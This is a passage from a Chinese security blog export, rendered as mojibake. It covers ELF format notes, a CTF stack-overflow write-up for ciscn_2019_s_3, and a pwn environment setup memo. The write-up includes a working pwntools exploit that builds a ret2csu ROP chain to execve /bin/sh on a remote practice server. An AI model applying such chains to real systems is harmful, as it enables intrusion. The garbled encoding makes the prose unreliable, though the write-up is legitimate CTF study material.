æ•°æ®æ®µå’Œåªè¯»æ•°æ®æ®µ.dataæ®µä¿å­˜å·²ç»åˆå§‹åŒ–äº†çš„å…¨å±€é™æ€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡,æ‰€ä»¥ä¸Šé¢ç¨‹åºä¸­.dataæ˜¯å…«ä¸ªå­—èŠ‚ .rodataå­˜æ”¾åªè¯»æ•°æ®ï¼Œä¸€èˆ¬æ˜¯ç¨‹åºé‡Œé¢çš„åªè¯»å˜é‡å’Œå­—ç¬¦ä¸²å¸¸é‡ï¼Œä¾‹å¦‚ä¸Šé¢ä¸­printfçš„å‚æ•°%d\\n\\0æ˜¯å››ä¸ªå­—èŠ‚ 1234Contents of section .data: 0000 54000000 55000000 T...U... Contents of section .rodata: 0000 25640a00 %d.. ä¹Ÿå¯ä»¥çœ‹å‡º.dataæ˜¯84 85ä»ä½åˆ°é«˜æ˜¯0x54 0x00 0x00 0x00 .rodataæ˜¯%d\\n\\0 3.3 BSSæ®µ.bssæ®µå­˜å‚¨æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡ã€‚ 3.4 å…¶ä»–æ®µ è¿™äº›æ®µéƒ½æ˜¯ç”±.æ¥åšå‰ç¼€ï¼Œè¯´æ˜è¿™äº›è¡¨çš„åå­—æ˜¯ç³»ç»Ÿä¿ç•™çš„ã€‚æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰æ®µåï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­æ’å…¥è¿™ä¸ªæ®µï¼Œè¾¾åˆ°è‡ªå·±æƒ³å¹²çš„äº‹æƒ…ã€‚ å°†ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å¦‚å›¾ç‰‡ï¼ŒéŸ³ä¹ä½œä¸ºç›®æ ‡æ–‡ä»¶çš„ä¸€ä¸ªæ®µ 12objcopy -I binary -O elf32-i386 -B i386 image.jpg image.oobjdump -ht image.o 4.ELFæ–‡ä»¶ç»“æ„æè¿° ELFç›®æ ‡æ–‡ä»¶æ ¼å¼æœ€å‰é¢æ˜¯ELFæ–‡ä»¶å¤´ï¼ŒåŒ…å«æ•´ä¸ªæ–‡ä»¶çš„åŸºæœ¬å±æ€§ï¼Œå¦‚ELFæ–‡ä»¶ç‰ˆæœ¬ã€ç›®æ ‡æœºå™¨å‹å·ã€ç¨‹åºå…¥å£åœ°å€ç­‰ã€‚ åœ¨ELFæ–‡ä»¶ä¸­ä¸æ®µæœ‰å…³çš„é‡è¦ç»“æ„å°±æ˜¯æ®µè¡¨(Section Hearder Table)ï¼Œè¯¥è¡¨æè¿°äº†ELFæ–‡ä»¶åŒ…å«çš„æ‰€æœ‰æ®µçš„ä¿¡æ¯ï¼Œå¦‚æ¯ä¸ªæ®µçš„æ®µåã€æ®µçš„é•¿åº¦ã€åœ¨æ–‡ä»¶ä¸­çš„åç§»å’Œè¯»å†™æƒé™ç­‰ã€‚ 4.1 æ–‡ä»¶å¤´æŸ¥çœ‹ELFæ–‡ä»¶ ELFå¤´ä¸­åŒ…æ‹¬äº†é­”æ•°ï¼Œæ–‡ä»¶æœºå™¨å­—èŠ‚é•¿åº¦ã€æ•°æ®å­˜å‚¨æ–¹å¼ã€ç‰ˆæœ¬ã€è¿è¡Œå¹³å°ã€ABIç‰ˆæœ¬ã€é‡å®šä½ç±»å‹ã€ç¡¬ä»¶å¹³å°ã€å¹³å°ç‰ˆæœ¬ã€å…¥å£åœ°å€ã€ç¨‹åºå¤´å…¥å£å’Œé•¿åº¦ã€æ®µè¡¨ä½ç½®å’Œé•¿åº¦åŠæ®µçš„æ•°é‡ ä¸ºäº†æ›´å¥½å®šä¹‰å„ä¸ªæˆå‘˜å¤§å°ã€elf.hæœ‰ä¸€å¥—è‡ªå·±å˜é‡ä½“ç³» ä¸‹é¢æ¥çœ‹ä¸€ä¸‹â€œElf32_Ehdrâ€è¿™ä¸ªç»“æ„ä½“ ä¹‹åæˆ‘ä»¬æ¥å¯¹ç…§ä¸€ä¸‹ è¿™é‡Œå…·ä½“æ¥è¯´ä¸€ä¸‹é­”æ•° é­”æ•°ï¼š ELFçš„é­”æ•°ä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯16å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”çš„16ä¸ªæ•°ç»„ æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚æ˜¯ELFæ–‡ä»¶å¿…é¡»ç›¸åŒçš„æ ‡è¯†ç  ä¸º0x7F 0x45 0x4C 0x46 7Fæ˜¯asciiä¸­çš„DELæ§åˆ¶ç¬¦ï¼Œ45 4c 46åˆ†åˆ«æ˜¯asciiä¸­çš„ELFã€‚å‡ ä¹æ‰€æœ‰å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼å¼€å§‹éƒ½æ˜¯é­”æ•°ï¼Œå¦‚a.outçš„0x01 0x07ï¼ŒPEä¸­çš„0x4d 0x5aã€‚ é‚£ä¹ˆé­”æ•°æ˜¯æ¥å¹²ä»€ä¹ˆçš„ï¼Ÿæ¨¡å¼æ˜¯ç”¨æ¥ç¡®è®¤æ–‡ä»¶çš„ç±»å‹ï¼Œæ“ä½œç³»ç»Ÿåœ¨åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™ä¼šç¡®è®¤é­”æ•°æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœä¸æ­£ç¡®å°†ä¼šæ‹’ç»åŠ è½½ã€‚ ä¸‹ä¸€ä¸ªå­—èŠ‚æ˜¯0x01è¡¨ç¤º32ä½ 0x02è¡¨ç¤º64ä½ ç¬¬6ä¸ªå­—èŠ‚åº è§„å®šæ˜¯å¤§ç«¯è¿˜æ˜¯å°ç«¯ ç¬¬7ä¸ªæ˜¯ä¸»ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸º1ã€‚åé¢çš„9ä¸ªä¸€èˆ¬å¡«0 æ–‡ä»¶ç±»å‹ e_typeæˆå‘˜è¡¨ç¤ºæ–‡ä»¶ç±»å‹ï¼Œå°±æ˜¯å‰é¢è¯´çš„ä¸‰ç§æ–‡ä»¶ç±»å‹ã€‚ æ“ä½œç³»ç»Ÿé€šè¿‡è¿™ä¸ªæ¥åˆ¤æ–­ELFæ–‡ä»¶ç±»å‹ï¼Œè€Œä¸æ˜¯é€šè¿‡åç¼€åã€‚ 4.2 æ®µè¡¨æ®µè¡¨ï¼ˆSection Header Tableï¼‰æ˜¯ä¿å­˜è¿™äº›æ®µçš„åŸºæœ¬å±æ€§çš„ç»“æ„ã€‚ å¯ä»¥è¯´ï¼ŒELFæ–‡ä»¶çš„æ®µç»“æ„å°±æ˜¯ç”±æ®µè¡¨æ¥å†³å®šçš„ï¼Œç¼–è¯‘å™¨ã€é“¾æ¥å™¨ã€å’Œè£…è½½å™¨éƒ½æ˜¯ä¾é æ®µè¡¨æ¥å®šä½å’Œè®¿é—®å„ä¸ªæ®µçš„å±æ€§çš„ã€‚ æ®µè¡¨ç”±ELFæ–‡ä»¶å¤´çš„e_shoffæˆå‘˜å†³å®šã€‚ ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹çœŸæ­£çš„æ®µ 12$ readelf -S a.o&#x2F;&#x2F;å„ä¸ªæ®µ æ¯ä¸ªæ®µéƒ½æ˜¯ä»¥Elf32_Shdrç»“æ„ä½“ï¼Œå› æ­¤Elf32_Shdråˆå«åšæ®µæè¿°ç¬¦ æ‰€ä»¥ä¸Šé¢å°±æ˜¯æœ‰13ä¸ªç»“æ„ä½“ï¼Œæ­¤å¤–ç¬¬ä¸€ä¸ªæ˜¯æ— ç”¨çš„ï¼Œæ‰€ä»¥åªæœ‰12ä¸ªæœ‰æ•ˆæ®µã€‚ å¯ä»¥æ¥çœ‹ä¸€ä¸‹Elf32_Shdr æ®µçš„ç±»å‹ æ®µçš„åå­—åªåœ¨é“¾æ¥å’Œç¼–è¯‘ä¸­æœ‰æ„ä¹‰ï¼Œä½†ä¸èƒ½çœŸæ­£è¡¨ç¤ºæ®µçš„ç±»å‹ã€‚ å¯¹äºç¼–è¯‘å™¨å’Œé“¾æ¥å™¨æ¥è¯´ï¼Œä¸»è¦å†³å®šæ®µçš„å±æ€§æ˜¯æ®µçš„ç±»å‹ï¼ˆsh_typeï¼‰å’Œæ®µçš„æ ‡å¿—ä½(sh_flags) æ®µçš„æ ‡å¿—ä½ æ®µçš„æ ‡å¿—ä½è¡¨ç¤ºè¯¥æ®µåœ¨è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„å±æ€§ï¼Œå¦‚æ˜¯å¦å¯å†™å¯æ‰§è¡Œç­‰ã€‚ æ®µçš„é“¾æ¥ä¿¡æ¯ å¦‚æœæ®µç±»å‹æ˜¯ä¸é“¾æ¥ç›¸å…³çš„ï¼Œå¦‚é‡å®šä½è¡¨ã€ç¬¦å·è¡¨ç­‰ï¼Œé‚£ä¹ˆsh_linkå’Œsh_infoæ˜¯æœ‰æ„ä¹‰çš„ 4.3 é‡å®šä½è¡¨é“¾æ¥å™¨åœ¨å¤„ç†ç›®æ ‡æ–‡ä»¶æ—¶ï¼Œéœ€è¦å¯¹ç›®æ ‡æ–‡ä»¶ä¸­æŸäº›éƒ¨ä½è¿›è¡Œé‡å®šä½ï¼Œå³ä»£ç æ®µå’Œæ•°æ®æ®µä¸­é‚£äº›å¯¹ç»å¯¹åœ°å€å¼•ç”¨çš„ä½ç½®ã€‚è¿™äº›é‡å®šä½è®°å½•éƒ½ä¼šè®°å½•åœ¨é‡å®šä½è¡¨é‡Œã€‚ .rel.textå°±æ˜¯ä¸€ä¸ªé‡å®šä½è¡¨ã€‚ æ¯ä¸ªé‡å®šä½çš„æ®µéƒ½ä¼šæœ‰ä¸€ä¸ªç›¸åº”çš„é‡å®šä½çš„è¡¨ã€‚ å¦‚.textä¸­æœ‰printfçš„è°ƒç”¨ï¼Œæ‰€ä»¥å°±ä¼šæœ‰.rel.textè€Œ.dataå°±æ²¡æœ‰é‡å®šä½çš„ã€‚ é‡å®šä½è¡¨åŒæ—¶ä¹Ÿæ˜¯ELFçš„ä¸€ä¸ªæ®µï¼Œæ‰€ä»¥è¿™ä¸ªæ®µçš„ç±»å‹å°±æ˜¯SHT_RELç±»å‹ã€‚sh_linkå°±æ˜¯ç¬¦å·è¡¨çš„ä¸‹æ ‡ï¼Œsh_infoå°±æ˜¯ä½œç”¨äºå“ªä¸ªæ®µã€‚ 4.4 å­—ç¬¦ä¸²è¡¨å­—ç¬¦ä¸²ç”±äºæ¯”è¾ƒå¤æ‚ï¼Œæ‰€ä»¥æŠŠå­—ç¬¦ä¸²é›†ä¸­åœ¨ä¸€ä¸ªè¡¨é‡Œå°±å¾ˆç®€ä¾¿ï¼Œç„¶åç”¨åç§»æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ã€‚ 5.ç¬¦å·åœ¨é“¾æ¥ä¸­ï¼Œç›®æ ‡æ–‡ä»¶ä¸­é—´ç›¸äº’æ‹¼åˆå®é™…ä¸Šæ˜¯ç›®æ ‡æ–‡ä»¶ä¹‹é—´å¯¹åœ°å€çš„å¼•ç”¨ã€‚å³å¯¹å‡½æ•°å’Œå˜é‡çš„åœ°å€çš„å¼•ç”¨ã€‚ å¦‚ç›®æ ‡æ–‡ä»¶Bç”¨ç›®æ ‡æ–‡ä»¶Aä¸­fooå‡½æ•°ï¼Œé‚£ä¹ˆå°±æ˜¯ç›®æ ‡æ–‡ä»¶Aå®šä¹‰äº†fooï¼Œç›®æ ‡æ–‡ä»¶Bå¼•ç”¨äº†fooã€‚ åœ¨é“¾æ¥ä¸­ï¼Œæˆ‘ä»¬å°†å‡½æ•°å’Œå˜é‡ç»Ÿç§°ä¸ºç¬¦å·ï¼Œå‡½æ•°åå’Œå˜é‡åä¸ºç¬¦å·å åœ¨é“¾æ¥è¿‡ç¨‹ä¸­å¾ˆå…³é”®å°±æ˜¯ç¬¦å·çš„ç®¡ç†ï¼Œæ¯ä¸€ä¸ªç›®æ ‡æ–‡ä»¶éƒ½ä¼šæœ‰ä¸€ä¸ªç›¸åº”çš„ç¬¦å·è¡¨ï¼Œè¿™ä¸ªè¡¨é‡Œé¢è®°å½•äº†ç›®æ ‡æ–‡ä»¶ç”¨åˆ°çš„æ‰€æœ‰ç¬¦å·ã€‚æ¯ä¸ªå®šä¹‰çš„ç¬¦å·æœ‰ä¸€ä¸ªå¯¹åº”çš„å€¼å«ç¬¦å·å€¼ï¼Œç¬¦å·å€¼å°±æ˜¯åœ°å€ã€‚ å…·ä½“ç¬¦å·æœ‰ä¸‹é¢å‡ ç§ç±»å‹ 12$ nm a.o&#x2F;&#x2F;çœ‹ç¬¦å· 5.1 ELFç¬¦å·è¡¨ç»“æ„ELFæ–‡ä»¶ä¸­ç¬¦å·è¡¨å¾€å¾€æ˜¯ä¸€ä¸ªæ®µï¼Œä¸€èˆ¬å«åš.symtabã€‚ç¬¦å·è¡¨çš„ç»“æ„æ˜¯ä¸€ä¸ªELF32_Symç»“æ„çš„æ•°ç»„ï¼Œæ¯ä¸ªç»“æ„éƒ½æ˜¯ä¸€ä¸ªç¬¦å·ã€‚ Elf32_Symçš„ç»“æ„å®šä¹‰ æˆå‘˜æ„ä¹‰å¦‚ä¸‹å›¾ ç¬¦å·ç±»å‹å’Œç»‘å®šä¿¡æ¯ï¼ˆst_infoï¼‰ æˆå‘˜ä½4ä¸ºæ˜¯ç¬¦å·çš„ç±»å‹ï¼Œé«˜28ä¸ºè¡¨ç¤ºç¬¦å·ç»‘å®šä¿¡æ¯ ç¬¦å·æ‰€åœ¨æ®µï¼ˆst_shndxï¼‰ å¦‚æœç¬¦å·å®šä¹‰åœ¨æœ¬ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæˆå‘˜è¡¨ç¤ºç¬¦å·æ‰€åœ¨çš„æ®µåœ¨æ®µè¡¨çš„ä¸‹æ ‡ï¼›ä½†å¦‚æœç¬¦å·ä¸æ˜¯å®šä¹‰åœ¨æœ¬ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œæˆ–è€…å¯¹äºæœ‰äº›ç‰¹æ®Šç¬¦å·ï¼Œsh_shndxçš„å€¼ä¼šæœ‰äº›ç‰¹æ®Š ç¬¦å·å€¼ ä¸Šæ–‡è¯´äº†ï¼Œç¬¦å·å€¼å°±æ˜¯æ¯ä¸€ä¸ªç¬¦å·çš„å˜é‡åœ°å€ å…·ä½“æ¥è¯´ï¼Œæœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„ç¬¦å·è¡¨ 1readelf -s a.o ç¬¬ä¸€åˆ—Numå°±æ˜¯æ•°ç»„ä¸‹æ ‡ï¼Œä»é›¶å¼€å§‹ ç¬¬äºŒåˆ—vauleå°±æ˜¯ç¬¦å·å€¼ï¼Œst_value ç¬¬ä¸‰åˆ—Sizeä¸ºç¬¦å·å¤§å°st_size ç¬¬å››åˆ—å’Œç¬¬äº”åˆ—ä¸ºç¬¦å·ç±»å‹å’Œç»‘å®šä¿¡æ¯ ç¬¬ä¸ƒåˆ—å°±æ˜¯Ndxå³st_shndxè¡¨ç¤ºç¬¦å·æ‰€åœ¨çš„æ®µã€‚ æœ€åä¸€åˆ—å°±æ˜¯ç¬¦å·åç§° å…·ä½“è§£é‡Šå¦‚ä¸‹ 5.2 ç‰¹æ®Šç¬¦å·ç‰¹æ®Šç¬¦å·å°±æ˜¯ä½ æ— é¡»å®šä¹‰å®ƒä»¬ï¼Œä½†ä½ å¯ä»¥å£°æ˜å¹¶ä½¿ç”¨ä»–ä»¬ã€‚ å¹¶ä¸”åªæœ‰ç”¨ldé“¾æ¥å™¨ç”Ÿäº§æœ€ç»ˆå¯æ‰§è¡Œæ–‡ä»¶è¿™äº›ç¬¦å·æ‰ä¼šå­˜åœ¨ï¼Œé“¾æ¥å™¨ä¼šåœ¨å°†ç¨‹åºæœ€ç»ˆé“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶æ˜¯å°†å…¶è§£ææˆæ­£ç¡®çš„å€¼ã€‚ åé¢çš„ç­¾åã€å¼ºå¼±å°±è·³è¿‡äº†ï¼Œéœ€è¦æ—¶ç»§ç»­ç ”ç©¶ã€‚ 0x03 é™æ€é“¾æ¥","categories":[],"tags":[{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"ä¸€é“æ ˆé¢˜","slug":"ä¸€é“æ ˆé¢˜","date":"2021-02-14T08:54:00.000Z","updated":"2021-02-14T11:40:29.979Z","comments":true,"path":"2021/02/14/ä¸€é“æ ˆé¢˜/","link":"","permalink":"https://pz1o.top/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/","excerpt":"","text":"ciscn_2019_s_3å›½èµ›çš„ä¸€é“æ ˆé¢˜ mainå‡½æ•° vulnå‡½æ•° gadgetså‡½æ•° çœ‹ä¸€ä¸‹gadgetså‡½æ•° é‡Œé¢æœ‰0fï¼ˆ15ï¼‰å’Œ3bï¼ˆ59ï¼‰çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªæ˜¯ä»€ä¹ˆ 15 sys_rt_sigreturn59 sys_execve æ¥ä¸‹æ¥è¯´ä¸€ä¸‹syscall syscallä»€ä¹ˆæ—¶syscall çœ‹wiki åœ¨32ä½å’Œ64ä½ä¸­æ˜¯æœ‰äº›ä¸åŒçš„ 32ä½ï¼š ä¼ å‚æ–¹å¼ï¼šé¦–å…ˆå°†ç³»ç»Ÿè°ƒç”¨å· ä¼ å…¥ eaxï¼Œç„¶åå°†å‚æ•° ä»å·¦åˆ°å³ ä¾æ¬¡å­˜å…¥ ebxï¼Œecxï¼Œedxå¯„å­˜å™¨ä¸­ï¼Œè¿”å›å€¼å­˜åœ¨eaxå¯„å­˜å™¨ è°ƒç”¨å·ï¼šsys_read çš„è°ƒç”¨å· ä¸º 3 sys_write çš„è°ƒç”¨å· ä¸º 4 è°ƒç”¨æ–¹å¼: ä½¿ç”¨ int 80h ä¸­æ–­è¿›è¡Œç³»ç»Ÿè°ƒç”¨ 64ä½ï¼š ä¼ å‚æ–¹å¼ï¼šé¦–å…ˆå°†ç³»ç»Ÿè°ƒç”¨å· ä¼ å…¥ raxï¼Œç„¶åå°†å‚æ•° ä»å·¦åˆ°å³ ä¾æ¬¡å­˜å…¥ rdiï¼Œrsiï¼Œrdxå¯„å­˜å™¨ä¸­ï¼Œè¿”å›å€¼å­˜åœ¨raxå¯„å­˜å™¨ è°ƒç”¨å·ï¼šsys_read çš„è°ƒç”¨å· ä¸º 0 sys_write çš„è°ƒç”¨å· ä¸º 1 stub_execve çš„è°ƒç”¨å· ä¸º 59 stub_rt_sigreturn çš„è°ƒç”¨å· ä¸º 15 è°ƒç”¨æ–¹å¼: ä½¿ç”¨ syscall è¿›è¡Œç³»ç»Ÿè°ƒç”¨ wpæ¥ä¸‹æ¥ç»§ç»­çœ‹é¢˜è§£ ä»æ±‡ç¼–ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ° åœ¨vulnå‡½æ•°ä¸­æœ‰æ ˆæº¢å‡º åŒæ—¶è¿™ä¸ªé¢˜è¿˜æœ‰ä¸€ä¸ªåœ°æ–¹ å°±æ˜¯æœ€åæ—¶æ²¡æœ‰leaveçš„ ä¹Ÿå°±æ˜¯offsetæ˜¯0x10ï¼Œä¹‹åå°±æ˜¯è¿”å›åœ°å€ æ¥ä¸‹æ¥çœ‹gadgets å®ƒé‡Œé¢æœ‰ä¸¤ä¸ªè°ƒç”¨å· 12mov raxï¼Œ0Fh &#x2F;&#x2F; 0Fh å³15 è€Œ15 å¯¹åº”çš„æ˜¯ sys_rt_sigreturnç³»ç»Ÿè°ƒç”¨mov raxï¼Œ3Bh &#x2F;&#x2F; 3Bh å³ 59 è€Œ15 å¯¹åº”çš„æ˜¯ sys_execve ç³»ç»Ÿè°ƒç”¨ æ‰€ä»¥æœ‰ä¸¤ç§æ–¹æ³• 12ç¬¬ä¸€ç§ï¼šåˆ©ç”¨ ret2__libc_csu_init å»æ„é€  execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) æ¥ getshellç¬¬äºŒç§ï¼šç›´æ¥srop ä¼ªé€  sigreturn frame å» æ„é€  execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) æ¥ getshell ç¬¬ä¸€ç§ret2__libc_csu_initæ—¢ç„¶æƒ³ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬å°±å¾—ä¼ å‚ 123rdi &quot;&#x2F;bin&#x2F;sh&quot;çš„æŒ‡é’ˆrsi 0rdx 0 é¦–å…ˆæƒ³åˆ°çš„è‚¯å®šæ˜¯gadget rdi rsi éƒ½æœ‰äº†ä½†é—®é¢˜æ˜¯æ²¡æœ‰rdx è¿™æ—¶å°±å¯ä»¥çœ‹idaäº† çœ‹åˆ°æœ‰rdx è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨gadgetäº†ï¼Œä½†é—®é¢˜æ˜¯è¦æƒ³è·å¾—/bin/shçš„æŒ‡é’ˆ å°±éœ€è¦çŸ¥é“æ ˆä¸Šçš„åœ°å€ ä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œçœ‹ç½‘ä¸Šwpï¼Œéƒ½è¯´writeä¸­æœ‰ï¼Œè°ƒè¯•äº†ä¸€ä¸‹ç¡®å® åŸå› ä¸å¤ªæ¸…æ¥š æ¥ä¸‹æ¥å°±æ˜¯å†™wpäº† ç¬¬ä¸€æ­¥æˆ‘ä»¬éœ€è¦å¾—åˆ°bin/shçš„æŒ‡é’ˆ æ¥ä¸‹æ¥ç¬¬äºŒæ­¥å°±æ˜¯ROPï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªä¸å¥½ç†è§£çš„å°±æ˜¯ 1call qword ptr [r12+rbx*8] å› ä¸ºæˆ‘ä»¬r12æ˜¯æŒ‡å‘æ ˆä¸Šçš„,ä¸”rbxæ¯æ¬¡éƒ½æ˜¯åŠ ä¸€ï¼Œè¿™æ ·å…¶å®å°±åˆ©ç”¨äº†æˆ‘ä»¬çš„gadget æœ€åå°±æ˜¯å¾ªç¯è°ƒç”¨ä¸Šé¢çš„callï¼ŒçŸ¥é“ç³»ç»Ÿè°ƒç”¨ 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *#from LibcSearcher import *#context.os='linux'#context.log_level='debug'#context.arch = elf.archs = lambda data :p.send(str(data))sa = lambda delim,data :p.sendafter(str(delim), str(data))sl = lambda data :p.sendline(str(data))sla = lambda delim,data :p.sendlineafter(str(delim), str(data))r = lambda num=4096 :p.recv(num)ru = lambda delims, drop=True :p.recvuntil(delims, drop)itr = lambda :p.interactive()uu32 = lambda data :u32(data.ljust(4,'\\0'))uu64 = lambda data :u64(data.ljust(8,'\\0'))leak = lambda name,addr :log.success('&#123;&#125; = &#123;:#x&#125;'.format(name, addr))# io = process(\"./ciscn_2019_s_3\")p = remote(\"node3.buuoj.cn\",28985)elf = ELF('./ciscn_s_3')vuln_addr=0x4004EDmov_rax_execv_addr=0x4004E2 pop_rdi_ret_addr=0x4005a3 pop_rbx_rbp_r12_r13_r14_r15_ret_addr=0x40059A__libc_csu_init_addr=0x400580 # __libc_csu_init gadget é¦–åœ°å€syscall_addr=0x400501 #idaä¸­æŸ¥çœ‹payload1='/bin/sh\\x00'*2+p64(vuln_addr)sl(payload1)r(0x20)bin_sh_addr=uu64(r(8))-280leak(\"/bin/sh\",bin_sh_addr)payload2='/bin/sh\\x00'*2+p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)+p64(0)*2+p64(bin_sh_addr+0x50)+p64(0)*3print(hex(bin_sh_addr+0x50))payload2+=p64(__libc_csu_init_addr)+p64(mov_rax_execv_addr)payload2+=p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr) sl(payload2)itr() è¿™å°±æ˜¯ret2__libc_csu_init() ç¬¬äºŒç§å…ˆä»‹ç»SROP SROPSROPä¹Ÿæ˜¯æ ˆæº¢å‡ºï¼Œä½†ä¸åŒROPçš„æ˜¯ã€‚ SROPä½¿ç”¨èƒ½å¤Ÿè°ƒç”¨sigreturnçš„gadgetè¦†ç›–è¿”å›åœ°å€ï¼Œå¹¶å°†ä¸€ä¸ªä¼ªé€ çš„sigcontextç»“æ„ä½“æ”¾åˆ°æ ˆä¸­ã€‚","categories":[],"tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"}]},{"title":"linuxå¤‡å¿˜å½•","slug":"linuxå¤‡å¿˜å½•","date":"2021-01-23T06:22:17.000Z","updated":"2021-02-04T07:57:06.777Z","comments":true,"path":"2021/01/23/linuxå¤‡å¿˜å½•/","link":"","permalink":"https://pz1o.top/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/","excerpt":"","text":"ä¸»è¦è®°å½•ä¸€äº›åŸºç¡€çš„linuxçŸ¥è¯† 0x01 å®‰è£…PWNç¯å¢ƒè¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹ä»0å¼€å§‹å®‰è£…pwnç¯å¢ƒ 1.vmtoolså…ˆæŒ‚è½½ä¸Š 123tar zxpf VMwareTools-x.x.x-yyyy.tar.gzcd vmware-tools-distribsudo .&#x2F;vmware-install.pl å®‰è£…å…ˆè¾“YES ä¹‹åç›´æ¥å›è½¦ 2.å®‰è£…git1sudo apt-get install git 3.å®‰è£…pippip2 1sudo apt install python-pip pip3 1sudo apt install python3-pip 4.å®‰è£…vim12sudo apt-get remove vim-commonsudo apt-get install vim 5.å®‰è£…pwntools1pip install pwntools 6.å®‰è£…libcSearcher1234git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.gitcd LibcSearchersudo python setup.py installæŠŠLibcSearcher.pyæ”¾åœ¨expç›¸åŒç›®å½•ä¸‹è¿è¡Œexp.pyå³å¯ 1234567å…ˆå®‰è£…libcåº“expç‰‡æ®µï¼šfrom LibcSearcher import *elf&#x3D;ELF(&#39;libc.xx.xx&#39;)libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)offset &#x3D; write_addr - libc.dump(&#39;write&#39;)sys_addr &#x3D; offset + libc.dump(&#39;system&#39;) 7.å®‰è£…One_gadget12sudo apt install rubysudo gem install one_gadget 8.å®‰è£…pwndbg123git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbgcd pwndbg.&#x2F;setup.sh 9.å®‰è£…ssh123sudo apt-get install openssh-server&#x2F;&#x2F;å¼€å¯æœåŠ¡sudo service ssh start é…ç½®æ–‡ä»¶/etc/ssh/sshd_config 10.å®‰è£…condacondaæ˜¯ä¸€ä¸ªå¼€æºçš„è½¯ä»¶åŒ…ç®¡ç†ç³»ç»Ÿå’Œç¯å¢ƒç®¡ç†ç³»ç»Ÿï¼Œç”¨äºå®‰è£…å¤šä¸ªç‰ˆæœ¬çš„è½¯ä»¶åŒ…åŠå…¶ä¾èµ–å…³ç³»ï¼Œå¹¶åœ¨å®ƒä»¬ä¹‹é—´è½»æ¾åˆ‡æ¢ã€‚ 1234567891011121314151617181920212223242526wget -c https:&#x2F;&#x2F;repo.continuum.io&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-x86_64.shchmod 777 Miniconda3-latest-Linux-x86_64.shsh Miniconda3-latest-Linux-x86_64.sh &#x2F;&#x2F;é…ç½®æºconda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;bioconda&#x2F;conda config --set show_channel_urls yes conda config --get channels&#x2F;&#x2F;åˆ é™¤é…ç½®æºconda config --remove-key channels&#x2F;&#x2F;ç¯å¢ƒå‘½ä»¤conda env list&#x2F;&#x2F;åˆ›å»ºç¯å¢ƒconda create -n 3.6.7 python&#x3D;3.6.7&#x2F;&#x2F;åˆ‡æ¢ç¯å¢ƒconda activate&#x2F;&#x2F;é€€å‡ºç¯å¢ƒconda deactivate&#x2F;&#x2F;ç§»é™¤ç¯å¢ƒconda remove -n env_name --all 0x02 ä¸€äº›å‘½ä»¤0x06 ç”¨æˆ·å’Œæƒé™1.ç”¨æˆ·1.1 ç”¨æˆ·æ ‡è¯†å·0ï¼š rootï¼Œè¶…çº§ç”¨æˆ·ã€‚1-499ï¼šç³»ç»Ÿç”¨æˆ·ï¼Œä¿è¯ç³»ç»ŸæœåŠ¡æ­£å¸¸è¿è¡Œï¼Œä¸€èˆ¬ä¸ä½¿ç”¨ã€‚500-60000ï¼šæ™®é€šç”¨æˆ·ï¼Œå¯ç™»å½•ç³»ç»Ÿï¼Œæ‹¥æœ‰ä¸€å®šçš„æƒé™ã€‚ç®¡ç†å‘˜æ·»åŠ 